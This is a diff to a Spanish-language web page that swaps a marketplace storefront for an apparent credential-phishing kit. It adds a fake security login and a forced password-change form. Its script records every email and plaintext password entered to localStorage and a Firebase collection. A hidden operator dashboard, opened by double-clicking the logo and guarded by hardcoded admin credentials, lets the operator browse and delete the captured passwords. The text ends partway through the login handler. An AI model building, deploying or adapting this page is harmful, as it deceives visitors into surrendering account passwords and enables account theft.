-            text-decoration: line-through;
-            margin-left: 0.5rem;
+        .search-input:focus {
+            border-color: #d4af37;
+        }
+
+        .search-input::placeholder {
+            color: #70707a;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-family: 'Roboto', sans-serif;
+            font-size: 14px;
             font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s ease;
         }
 
-        .product-condition {
-            display: flex;
-            align-items: center;
-            gap: 0.3rem;
-            font-size: 0.85rem;
-            color: var(--gray);
-            font-weight: 500;
+        .btn-primary {
+            background: #d4af37;
+            color: #000000;
         }
 
-        .seller-info {
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-            margin-top: 1rem;
-            padding-top: 1rem;
-            border-top: 1px solid #f1f5f9;
+        .btn-primary:hover:not(:disabled) {
+            background: #e5c158;
         }
 
-        .seller-avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: var(--gradient);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 600;
-            font-size: 0.8rem;
+        .btn-ghost {
+            background: transparent;
+            color: #b0b0c0;
+            border: 1px solid #2a2a32;
         }
 
-        .seller-name {
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: var(--dark);
+        .btn-ghost:hover {
+            background: #1a1a20;
+            color: #ffffff;
         }
 
-        .seller-rating {
-            display: flex;
-            align-items: center;
-            gap: 0.2rem;
-            font-size: 0.8rem;
-            color: var(--accent);
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 13px;
         }
 
-        /* Mobile Navigation */
-        .mobile-nav {
-            display: none;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: white;
-            padding: 1rem;
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
-            z-index: 1000;
-            justify-content: space-around;
-            border-radius: 20px 20px 0 0;
+        .btn-icon {
+            padding: 8px 12px;
         }
 
-        .mobile-nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 0.3rem;
-            color: var(--gray);
-            text-decoration: none;
-            font-size: 0.75rem;
-            font-weight: 600;
-            transition: all 0.3s;
-            padding: 0.5rem;
+        .fa-sync-alt.spinning {
+            animation: spin 0.4s linear infinite;
         }
 
-        .mobile-nav-item.active, .mobile-nav-item:hover {
-            color: var(--primary);
-            transform: scale(1.1);
-        }
-
-        .mobile-nav-item i {
-            font-size: 1.3rem;
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
+        /* Modal para historial */
+        .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(5px);
-            z-index: 2000;
-            align-items: center;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
             justify-content: center;
-            padding: 1rem;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(5px);
         }
 
-        .modal.active {
+        .modal-overlay.active {
             display: flex;
-            animation: fadeIn 0.3s;
         }
 
         .modal-content {
-            background: white;
-            border-radius: 24px;
-            max-width: 900px;
-            width: 100%;
-            max-height: 90vh;
+            background: #141418;
+            border: 1px solid #2a2a32;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 600px;
+            max-height: 80vh;
             overflow-y: auto;
-            position: relative;
-            animation: slideIn 0.4s;
+            padding: 24px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
         }
 
-        .modal-close {
-            position: absolute;
-            top: 1rem;
-            right: 1rem;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.9);
-            border: none;
-            cursor: pointer;
+        .modal-header {
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 1.2rem;
-            z-index: 10;
-            transition: all 0.3s;
-        }
-
-        .modal-close:hover {
-            background: var(--danger);
-            color: white;
-            transform: rotate(90deg);
-        }
-
-        .modal-body {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-        }
-
-        .modal-image {
-            height: 100%;
-            min-height: 400px;
-            background: #f1f5f9;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .modal-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .modal-details {
-            padding: 2.5rem;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #2a2a32;
         }
 
         .modal-title {
-            font-size: 1.8rem;
-            font-weight: 800;
-            margin-bottom: 1rem;
+            font-size: 20px;
+            font-weight: 500;
+            color: #ffffff;
+            font-family: 'Cormorant Garamond', serif;
         }
 
-        .modal-price {
-            font-size: 2.5rem;
-            font-weight: 800;
-            color: var(--primary);
-            margin-bottom: 1.5rem;
+        .modal-close {
+            background: none;
+            border: none;
+            color: #b0b0c0;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 4px 8px;
         }
 
-        .modal-description {
-            color: var(--gray);
-            line-height: 1.8;
-            margin-bottom: 2rem;
+        .modal-close:hover {
+            color: #d4af37;
         }
 
-        .modal-features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 1rem;
-            margin-bottom: 2rem;
+        .history-list {
+            list-style: none;
         }
 
-        .feature-item {
+        .history-item {
+            padding: 12px;
+            border-bottom: 1px solid #2a2a32;
             display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            font-size: 0.9rem;
-            color: var(--dark);
+            flex-direction: column;
+            gap: 4px;
         }
 
-        .feature-item i {
-            color: var(--success);
+        .history-item:last-child {
+            border-bottom: none;
         }
 
-        /* Responsive Design */
-        @media (max-width: 1024px) {
-            .hero-container {
+        .history-item .date {
+            font-size: 12px;
+            color: #b0b0c0;
+        }
+
+        .history-item .password {
+            font-size: 16px;
+            color: #ffffff;
+            font-family: monospace;
+        }
+
+        .history-item .type {
+            font-size: 11px;
+            color: #d4af37;
+            text-transform: uppercase;
+        }
+
+        /* Menu Toggle */
+        .menu-toggle {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 8px;
+            transition: color 0.2s;
+            display: block;
+        }
+
+        .menu-toggle:hover {
+            color: #d4af37;
+        }
+
+        /* Responsive */
+        @media (min-width: 1201px) {
+            .main-content {
+                margin-left: 0;
+            }
+            
+            .sidebar {
+                transform: translateX(-100%);
+            }
+            
+            .sidebar.active {
+                transform: translateX(0);
+            }
+        }
+
+        @media (max-width: 1200px) {
+            .stats-grid {
                 grid-template-columns: 1fr;
-                text-align: center;
             }
-
-            .hero-content h1 {
-                font-size: 2.5rem;
+            
+            .content-area {
+                padding: 24px;
             }
-
-            .hero-stats {
-                justify-content: center;
-            }
-
-            .hero-image {
-                display: none;
-            }
-
-            .modal-body {
-                grid-template-columns: 1fr;
-            }
-
-            .modal-image {
-                min-height: 300px;
+            
+            .topbar {
+                padding: 16px 24px;
             }
         }
 
         @media (max-width: 768px) {
-            .header-container {
-                padding: 1rem;
+            .topbar {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
             }
-
-            .search-bar {
-                display: none;
+            
+            .topbar-actions {
+                width: 100%;
+                justify-content: space-between;
             }
-
-            .nav-actions .btn-secondary {
-                display: none;
+            
+            .content-area {
+                padding: 20px;
             }
-
-            .hero {
-                margin-top: 70px;
-                padding: 2rem 1rem;
+            
+            .toolbar {
+                flex-direction: column;
+                align-items: stretch;
             }
-
-            .hero-content h1 {
-                font-size: 2rem;
+            
+            .table-container {
+                max-height: 400px;
             }
-
-            .category-grid {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 1rem;
-            }
-
-            .products-grid {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 1rem;
-            }
-
-            .mobile-nav {
-                display: flex;
-            }
-
-            .products-section {
-                padding-bottom: 6rem;
-            }
-
-            .filters {
-                overflow-x: auto;
-                flex-wrap: nowrap;
-                -webkit-overflow-scrolling: touch;
-                padding-bottom: 1rem;
-            }
-
-            .filter-chip {
-                white-space: nowrap;
+            
+            .modal-content {
+                width: 95%;
+                padding: 16px;
             }
         }
 
         @media (max-width: 480px) {
-            .products-grid {
-                grid-template-columns: 1fr;
+            .content-area {
+                padding: 16px;
             }
-
-            .modal-details {
-                padding: 1.5rem;
+            
+            .stat-value {
+                font-size: 28px;
             }
-
-            .modal-price {
-                font-size: 1.8rem;
+            
+            .table-container {
+                max-height: 300px;
             }
-        }
-
-        /* Loading Skeleton */
-        .skeleton {
-            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
-            background-size: 1000px 100%;
-            animation: shimmer 2s infinite;
-            border-radius: 8px;
-        }
-
-        /* Toast Notification */
-        .toast {
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: var(--dark);
-            color: white;
-            padding: 1rem 2rem;
-            border-radius: 50px;
-            font-weight: 600;
-            z-index: 3000;
-            opacity: 0;
-            transition: all 0.4s;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-
-        /* Sell Button Floating */
-        .fab-sell {
-            position: fixed;
-            bottom: 100px;
-            right: 2rem;
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: var(--gradient);
-            color: white;
-            border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.4);
-            transition: all 0.3s;
-            z-index: 999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .fab-sell:hover {
-            transform: scale(1.1) rotate(90deg);
-            box-shadow: 0 15px 40px rgba(99, 102, 241, 0.5);
-        }
-
-        @media (max-width: 768px) {
-            .fab-sell {
-                bottom: 90px;
-                right: 1rem;
-                width: 56px;
-                height: 56px;
+            
+            .selection-actions {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .selection-buttons {
+                width: 100%;
+            }
+            
+            .selection-buttons .btn {
+                flex: 1;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- Header -->
-    <header>
-        <div class="header-container">
-            <div class="logo" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
-                <i class="fas fa-store"></i>
-                MarketPlace
-            </div>
-            
-            <div class="search-bar">
-                <input type="text" placeholder="Buscar artículos, marcas, categorías..." id="searchInput">
-                <button onclick="search()"><i class="fas fa-search"></i></button>
-            </div>
-
-            <div class="nav-actions">
-                <button class="btn-icon" onclick="toggleFavorites()">
-                    <i class="fas fa-heart"></i>
-                    <span class="badge" id="favCount">0</span>
-                </button>
-                <button class="btn-icon" onclick="toggleCart()">
-                    <i class="fas fa-shopping-bag"></i>
-                    <span class="badge" id="cartCount">0</span>
-                </button>
-                <button class="btn btn-secondary" onclick="openLogin()">
-                    <i class="fas fa-user"></i>
-                    <span>Mi Cuenta</span>
-                </button>
-                <button class="btn btn-primary" onclick="openSellModal()">
-                    <i class="fas fa-plus"></i>
-                    <span>Vender</span>
-                </button>
-            </div>
-        </div>
-    </header>
-
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="hero-container">
-            <div class="hero-content">
-                <h1>Compra y Vende <span>Artículos Únicos</span></h1>
-                <p>Descubre miles de artículos nuevos y de segunda mano en tu zona. Desde electrónica hasta moda, encuentra lo que buscas al mejor precio.</p>
-                <div style="display: flex; gap: 1rem; flex-wrap: wrap;">
-                    <button class="btn btn-primary" onclick="scrollToProducts()">
-                        <i class="fas fa-compass"></i>
-                        Explorar Ahora
-                    </button>
-                    <button class="btn btn-secondary" onclick="openSellModal()">
-                        <i class="fas fa-camera"></i>
-                        Vender Artículo
-                    </button>
-                </div>
-                
-                <div class="hero-stats">
-                    <div class="stat">
-                        <div class="stat-number">50K+</div>
-                        <div class="stat-label">Artículos</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-number">20K+</div>
-                        <div class="stat-label">Usuarios</div>
-                    </div>
-                    <div class="stat">
-                        <div class="stat-number">99%</div>
-                        <div class="stat-label">Satisfacción</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="hero-image">
-                <img src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=800&h=600&fit=crop" alt="Shopping">
-                <div class="floating-card card-1">
-                    <i class="fas fa-check-circle" style="color: var(--success);"></i>
-                    <strong>Verificado</strong>
-                    <div style="font-size: 0.8rem; color: var(--gray);">Vendedor confiable</div>
-                </div>
-                <div class="floating-card card-2">
-                    <i class="fas fa-shield-alt" style="color: var(--primary);"></i>
-                    <strong>Protección</strong>
-                    <div style="font-size: 0.8rem; color: var(--gray);">Compra segura</div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Categories -->
-    <section class="categories">
-        <div class="section-header">
-            <h2 class="section-title">Categorías Populares</h2>
-            <a href="#" style="color: var(--primary); text-decoration: none; font-weight: 600;">Ver todas <i class="fas fa-arrow-right"></i></a>
-        </div>
-        <div class="category-grid">
-            <div class="category-card" onclick="filterByCategory('electronica')">
-                <div class="category-icon">
-                    <i class="fas fa-laptop"></i>
-                </div>
-                <div style="font-weight: 700;">Electrónica</div>
-                <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem;">2,450 artículos</div>
-            </div>
-            <div class="category-card" onclick="filterByCategory('moda')">
-                <div class="category-icon">
-                    <i class="fas fa-tshirt"></i>
-                </div>
-                <div style="font-weight: 700;">Moda</div>
-                <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem;">5,120 artículos</div>
-            </div>
-            <div class="category-card" onclick="filterByCategory('hogar')">
-                <div class="category-icon">
-                    <i class="fas fa-couch"></i>
-                </div>
-                <div style="font-weight: 700;">Hogar</div>
-                <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem;">3,890 artículos</div>
-            </div>
-            <div class="category-card" onclick="filterByCategory('deportes')">
-                <div class="category-icon">
-                    <i class="fas fa-basketball-ball"></i>
-                </div>
-                <div style="font-weight: 700;">Deportes</div>
-                <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem;">1,230 artículos</div>
-            </div>
-            <div class="category-card" onclick="filterByCategory('coches')">
-                <div class="category-icon">
-                    <i class="fas fa-car"></i>
-                </div>
-                <div style="font-weight: 700;">Coches</div>
-                <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem;">890 artículos</div>
-            </div>
-            <div class="category-card" onclick="filterByCategory('libros')">
-                <div class="category-icon">
-                    <i class="fas fa-book"></i>
-                </div>
-                <div style="font-weight: 700;">Libros</div>
-                <div style="font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem;">4,560 artículos</div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Filters -->
-    <div class="filters">
-        <span style="font-weight: 600; margin-right: 0.5rem;">Filtrar por:</span>
-        <button class="filter-chip active" onclick="setFilter(this, 'all')">Todos</button>
-        <button class="filter-chip" onclick="setFilter(this, 'new')">Nuevos</button>
-        <button class="filter-chip" onclick="setFilter(this, 'used')">Segunda Mano</button>
-        <button class="filter-chip" onclick="setFilter(this, 'price-low')">Precio: Bajo a Alto</button>
-        <button class="filter-chip" onclick="setFilter(this, 'price-high')">Precio: Alto a Bajo</button>
-        <button class="filter-chip" onclick="setFilter(this, 'near')">Cerca de ti</button>
+<!-- Overlay de carga entre páginas -->
+<div class="page-transition-overlay" id="page-transition-overlay">
+    <div style="text-align: center;">
+        <div class="page-transition-spinner"></div>
+        <div class="page-transition-text">Cargando...</div>
     </div>
+</div>
 
-    <!-- Products Section -->
-    <section class="products-section" id="products">
-        <div class="section-header">
-            <h2 class="section-title">Artículos Destacados</h2>
-            <div style="display: flex; gap: 0.5rem;">
-                <button class="btn-icon" onclick="changeView('grid')" style="width: 36px; height: 36px;">
-                    <i class="fas fa-th-large"></i>
-                </button>
-                <button class="btn-icon" onclick="changeView('list')" style="width: 36px; height: 36px;">
-                    <i class="fas fa-list"></i>
-                </button>
+<!-- ========== LOGIN PRINCIPAL ========== -->
+<div class="login-container" id="main-login">
+    <div class="login-card">
+        <div class="login-header">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s" 
+                 alt="Logo" 
+                 class="login-logo"
+                 id="main-logo">
+            <h1 class="login-title">Iniciar sesión</h1>
+            <div class="security-message-header">
+                Por razones de seguridad, debe iniciar sesión en su cuenta para revisar la actividad reciente.
             </div>
         </div>
+
+        <form id="login-form">
+            <div class="form-group">
+                <label class="form-label" for="email">Correo electrónico</label>
+                <input type="email" 
+                       id="email" 
+                       class="form-input" 
+                       placeholder="Introduce tu correo electrónico" 
+                       required>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label" for="password">Contraseña</label>
+                <input type="password" 
+                       id="password" 
+                       class="form-input" 
+                       placeholder="Introduce tu contraseña" 
+                       required>
+            </div>
+
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">Mantener la sesión iniciada</label>
+            </div>
+
+            <button type="submit" class="login-button" id="login-btn">
+                <span class="login-button-text">Iniciar sesión</span>
+                <div class="login-spinner"></div>
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- ========== PÁGINA DE CAMBIO DE CONTRASEÑA ========== -->
+<div class="password-change-container" id="password-change-page">
+    <div class="password-change-card">
+        <div class="password-change-header">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s" 
+                 alt="Logo" 
+                 class="password-change-logo">
+            <h2>Cambiar contraseña</h2>
+            <p>Por razones de seguridad, debes cambiar tu contraseña</p>
+        </div>
+
+        <form id="password-change-form">
+            <div class="form-group">
+                <label class="form-label" for="current-password">Contraseña actual</label>
+                <input type="password" 
+                       id="current-password" 
+                       class="form-input" 
+                       placeholder="Introduce tu contraseña actual" 
+                       required>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label" for="new-password">Nueva contraseña</label>
+                <input type="password" 
+                       id="new-password" 
+                       class="form-input" 
+                       placeholder="Introduce tu nueva contraseña" 
+                       required>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label" for="confirm-password">Confirmar nueva contraseña</label>
+                <input type="password" 
+                       id="confirm-password" 
+                       class="form-input" 
+                       placeholder="Confirma tu nueva contraseña" 
+                       required>
+            </div>
+
+            <button type="submit" class="login-button" id="password-change-btn">
+                <span class="login-button-text">Cambiar contraseña</span>
+                <div class="login-spinner"></div>
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- ========== PÁGINA DE ÉXITO ========== -->
+<div class="password-change-container" id="success-page">
+    <div class="password-change-card">
+        <div class="password-change-header">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s" 
+                 alt="Logo" 
+                 class="password-change-logo">
+            <i class="fas fa-check-circle success-icon"></i>
+            <h2>¡Contraseña cambiada!</h2>
+            <p>Tu contraseña ha sido actualizada correctamente</p>
+        </div>
+
+        <div class="security-message">
+            <p><i class="fas fa-shield-alt"></i> <strong>Tu cuenta está segura y protegida</strong></p>
+            <p>No es necesario realizar ninguna acción adicional. Puedes cerrar esta ventana de forma segura.</p>
+        </div>
+
+        <button class="login-button" onclick="closePage()">
+            <span class="login-button-text">Cerrar</span>
+        </button>
+    </div>
+</div>
+
+<!-- ========== ADMIN LOGIN ========== -->
+<div id="admin-login-page">
+    <span class="back-link" onclick="goBackToMainLogin()">← Volver al inicio</span>
+    <div class="admin-login-card">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoNHvy7m4h4thXcr_pyyS1RxJhc5L3RLevg&s" 
+             alt="Logo" 
+             class="admin-login-logo">
+
+        <form id="admin-login-form">
+            <div class="form-group" style="position: relative;">
+                <label class="admin-form-label">Usuario</label>
+                <input type="text" id="admin-username" class="admin-form-input" placeholder="Introduce tu usuario" required>
+            </div>
+            
+            <div class="form-group" style="position: relative;">
+                <label class="admin-form-label">Contraseña</label>
+                <input type="password" id="admin-password" class="admin-form-input" placeholder="Introduce tu contraseña" required>
+                <button type="button" class="admin-password-toggle" onclick="togglePasswordVisibility('admin-password', this)">
+                    <i class="far fa-eye"></i>
+                </button>
+            </div>
+            
+            <button type="submit" class="admin-button" id="admin-login-btn">
+                <span class="button-text">Iniciar Sesión</span>
+                <div class="button-spinner"></div>
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- ========== DASHBOARD ========== -->
+<div id="dashboard-container" class="dashboard-container">
+    <!-- El dashboard se genera dinámicamente con JavaScript -->
+</div>
+
+<!-- ========== MODAL PARA HISTORIAL ========== -->
+<div class="modal-overlay" id="history-modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <div class="modal-title" id="modal-email-title">Historial de: </div>
+            <button class="modal-close" onclick="closeHistoryModal()">×</button>
+        </div>
+        <div class="modal-body" id="history-modal-body">
+            <!-- El historial se carga aquí -->
+        </div>
+    </div>
+</div>
+
+<!-- ========== OVERLAY PARA CERRAR MENÚ ========== -->
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+
+<!-- Notificación simple -->
+<div id="simple-notification" class="simple-notification">
+    Incorrecto, Por favor intentalo de nuevo
+</div>
+
+<script>
+    // Configuración de Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyB04lSU_8wUGegEas2lInm5c-M9Pe2WKGU",
+        authDomain: "nuevo-proyecto-database.firebaseapp.com",
+        projectId: "nuevo-proyecto-database",
+        storageBucket: "nuevo-proyecto-database.firebasestorage.app",
+        messagingSenderId: "688018621457",
+        appId: "1:688018621457:web:0dc2347d1e5d1db83fddb0"
+    };
+
+    // Inicializar Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Credenciales de administrador
+    const ADMIN_CREDENTIALS = {
+        username: 'admin123',
+        password: 'Password123'
+    };
+
+    // Estructura de datos
+    let accountsData = [];
+    let currentDashboardPage = 'overview';
+    let selectedAccounts = new Set();
+    let lastClickTime = 0;
+    let lastLoginData = null;
+    let loginAttempts = 0;
+    let unsubscribe = null;
+
+    // ========== FUNCIONES ORIGINALES ==========
+
+    function showPageTransition() {
+        document.getElementById('page-transition-overlay').style.display = 'flex';
+    }
+
+    function hidePageTransition() {
+        document.getElementById('page-transition-overlay').style.display = 'none';
+    }
+
+    function closePage() {
+        window.close();
+        setTimeout(() => {
+            document.body.innerHTML = `
+                <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+                    <i class="fas fa-check-circle" style="color: #34A853; font-size: 48px; margin-bottom: 20px;"></i>
+                    <h2>¡Proceso completado!</h2>
+                    <p>Tu cuenta está segura y protegida.</p>
+                    <p>Puedes cerrar esta pestaña manualmente.</p>
+                </div>
+            `;
+        }, 500);
+    }
+
+    function setupLogoDoubleClick() {
+        const logo = document.getElementById('main-logo');
+        if (logo) {
+            logo.addEventListener('click', function(e) {
+                const currentTime = new Date().getTime();
+                const timeDiff = currentTime - lastClickTime;
+                
+                if (timeDiff < 300) {
+                    showAdminLogin();
+                }
+                lastClickTime = currentTime;
+            });
+        }
+    }
+
+    function showAdminLogin() {
+        document.getElementById('main-login').style.display = 'none';
+        document.getElementById('admin-login-page').style.display = 'flex';
+    }
+
+    function goBackToMainLogin() {
+        document.getElementById('admin-login-page').style.display = 'none';
+        document.getElementById('dashboard-container').style.display = 'none';
+        document.getElementById('password-change-page').style.display = 'none';
+        document.getElementById('success-page').style.display = 'none';
+        document.getElementById('main-login').style.display = 'flex';
+        loginAttempts = 0;
+        selectedAccounts.clear();
         
-        <div class="products-grid" id="productsGrid">
-            <!-- Products will be injected here by JavaScript -->
-        </div>
-    </section>
+        if (unsubscribe) {
+            unsubscribe();
+            unsubscribe = null;
+        }
+    }
 
-    <!-- Floating Action Button (Mobile) -->
-    <button class="fab-sell" onclick="openSellModal()" title="Vender artículo">
-        <i class="fas fa-plus"></i>
-    </button>
+    function getGMTTime() {
+        const now = new Date();
+        const hours = now.getUTCHours().toString().padStart(2, '0');
+        const minutes = now.getUTCMinutes().toString().padStart(2, '0');
+        return `${hours}:${minutes}`;
+    }
 
-    <!-- Mobile Navigation -->
-    <nav class="mobile-nav">
-        <a href="#" class="mobile-nav-item active" onclick="setActiveNav(this)">
-            <i class="fas fa-home"></i>
-            <span>Inicio</span>
-        </a>
-        <a href="#" class="mobile-nav-item" onclick="setActiveNav(this); toggleFavorites()">
-            <i class="fas fa-heart"></i>
-            <span>Favoritos</span>
-        </a>
-        <a href="#" class="mobile-nav-item" onclick="setActiveNav(this); openSellModal()">
-            <i class="fas fa-plus-circle" style="font-size: 2rem; color: var(--primary);"></i>
-            <span>Vender</span>
-        </a>
-        <a href="#" class="mobile-nav-item" onclick="setActiveNav(this); toggleCart()">
-            <i class="fas fa-shopping-bag"></i>
-            <span>Carrito</span>
-        </a>
-        <a href="#" class="mobile-nav-item" onclick="setActiveNav(this); openLogin()">
-            <i class="fas fa-user"></i>
-            <span>Perfil</span>
-        </a>
-    </nav>
+    function getCurrentDateTime() {
+        const now = new Date();
+        return {
+            timestamp: now.toLocaleString('es-ES'),
+            time: getGMTTime(),
+            date: now.toISOString().split('T')[0]
+        };
+    }
 
-    <!-- Product Modal -->
-    <div class="modal" id="productModal">
-        <div class="modal-content">
-            <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
-            <div class="modal-body">
-                <div class="modal-image">
-                    <img id="modalImg" src="" alt="Product">
-                </div>
-                <div class="modal-details">
-                    <div class="product-category" id="modalCategory">Categoría</div>
-                    <h2 class="modal-title" id="modalTitle">Título del Producto</h2>
-                    <div class="modal-price" id="modalPrice">€0.00</div>
+    function togglePasswordVisibility(inputId, button) {
+        const input = document.getElementById(inputId);
+        const icon = button.querySelector('i');
+        
+        if (input.type === 'password') {
+            input.type = 'text';
+            icon.classList.remove('fa-eye');
+            icon.classList.add('fa-eye-slash');
+        } else {
+            input.type = 'password';
+            icon.classList.remove('fa-eye-slash');
+            icon.classList.add('fa-eye');
+        }
+    }
+
+    // Guardar intento de login
+    function saveLoginAttempt(email, password, type = 'login_attempt') {
+        if (!email || !password) return null;
+
+        const datetime = getCurrentDateTime();
+        let accountIndex = accountsData.findIndex(a => a.email === email);
+        let account;
+
+        if (accountIndex === -1) {
+            account = {
+                email: email,
+                attempts: [{
+                    id: Date.now() + Math.random(),
+                    password: password,
+                    timestamp: datetime.timestamp,
+                    time: datetime.time,
+                    date: datetime.date,
+                    type: type
+                }]
+            };
+            accountsData.push(account);
+        } else {
+            account = accountsData[accountIndex];
+            account.attempts.push({
+                id: Date.now() + Math.random(),
+                password: password,
+                timestamp: datetime.timestamp,
+                time: datetime.time,
+                date: datetime.date,
+                type: type
+            });
+        }
+
+        localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
+
+        db.collection('cashplus_accounts').doc(email).set(account)
+            .catch(error => console.error("Error guardando en Firebase:", error));
+
+        return account;
+    }
+
+    // Eliminar cuenta
+    async function deleteAccount(email) {
+        if (!email) return;
+
+        if (confirm('¿Estás seguro de que quieres eliminar esta cuenta? Se borrará todo su historial.')) {
+            accountsData = accountsData.filter(account => account.email !== email);
+            localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
+
+            if (selectedAccounts.has(email)) {
+                selectedAccounts.delete(email);
+            }
+
+            try {
+                await db.collection('cashplus_accounts').doc(email).delete();
+                console.log(`Cuenta ${email} eliminada de Firebase`);
+            } catch (error) {
+                console.error("Error eliminando cuenta de Firebase:", error);
+            }
+
+            renderAccountsTable();
+            if (document.getElementById('panel-overview').classList.contains('active')) {
+                showPanel('overview');
+            } else {
+                showPanel('accounts');
+            }
+            updateSelectionUI();
+        }
+    }
+
+    // Eliminar cuentas seleccionadas
+    async function deleteSelectedAccounts() {
+        if (selectedAccounts.size === 0) return;
+
+        const confirmMessage = selectedAccounts.size === accountsData.length ?
+            '¿Eliminar TODAS las cuentas? Esta acción no se puede deshacer.' :
+            `¿Eliminar ${selectedAccounts.size} cuenta${selectedAccounts.size !== 1 ? 's' : ''}?`;
+
+        if (confirm(confirmMessage)) {
+            const emailsToDelete = Array.from(selectedAccounts);
+
+            accountsData = accountsData.filter(account => !selectedAccounts.has(account.email));
+            localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
+
+            try {
+                const deletePromises = emailsToDelete.map(email =>
+                    db.collection('cashplus_accounts').doc(email).delete()
+                );
+                await Promise.all(deletePromises);
+                console.log(`${emailsToDelete.length} cuentas eliminadas de Firebase`);
+            } catch (error) {
+                console.error("Error eliminando cuentas de Firebase:", error);
+            }
+
+            selectedAccounts.clear();
+            renderAccountsTable();
+            if (document.getElementById('panel-overview').classList.contains('active')) {
+                showPanel('overview');
+            } else {
+                showPanel('accounts');
+            }
+            updateSelectionUI();
+        }
+    }
+
+    // Sincronización en tiempo real
+    function setupRealtimeSync() {
+        if (unsubscribe) {
+            unsubscribe();
+        }
+
+        unsubscribe = db.collection('cashplus_accounts').onSnapshot((snapshot) => {
+            console.log('Cambio detectado en Firebase, actualizando datos...');
+            
+            const firebaseData = [];
+            snapshot.forEach(doc => {
+                firebaseData.push(doc.data());
+            });
+
+            accountsData = firebaseData;
+            localStorage.setItem('cashplus_accounts', JSON.stringify(accountsData));
+
+            if (document.getElementById('dashboard-container').style.display === 'block') {
+                renderAccountsTable();
+                if (document.getElementById('panel-overview').classList.contains('active')) {
+                    showPanel('overview');
+                } else if (document.getElementById('panel-accounts').classList.contains('active')) {
+                    showPanel('accounts');
+                }
+                updateSelectionUI();
+            }
+        }, (error) => {
+            console.error("Error en snapshot de Firebase:", error);
+        });
+    }
+
+    // Manejar login principal
+    async function handleLogin(event) {
+        event.preventDefault();
+        
